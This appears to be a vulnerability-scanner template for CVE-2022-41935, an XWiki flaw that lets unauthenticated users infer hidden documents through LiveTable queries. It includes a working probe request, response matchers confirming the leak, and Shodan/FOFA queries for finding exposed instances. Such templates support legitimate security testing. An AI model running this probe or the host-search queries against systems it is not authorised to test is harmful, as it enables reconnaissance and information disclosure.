id: CVE-2022-41935

info:
  name: XWiki Unauthorized Document Existence Disclosure via LiveTable
  author: ProjectDiscoveryAI
  severity: medium
  description: Unauthorized users can deduce the existence of documents by repeated Livetable queries in XWiki, potentially exposing sensitive information.
  impact: |
    Potential exposure of sensitive information to unauthorized users.
  remediation: |
    Restrict access permissions to LiveTable feature in XWiki to authorized users only.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2022-41935
    cwe-id: CWE-200,NVD-CWE-Other
    epss-score: 0.00063
    epss-percentile: 0.28471
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"

http:
  - method: GET
    path:
      - "{{BaseURL}}/bin/get/XWiki/LiveTableResults?outputSyntax=plain&classname=&collist=doc.title%2Cdoc.location%2Cdoc.content&doc.title=Sandbo&doc.location=Sandbox.TestPage3&doc.content=dummy&limit=0"

    matchers:
      - type: word
        words:
          - '"totalrows": 1'
          - '"doc_viewable": false'
          - '"doc_fullName": "obfuscated"'
        condition: and
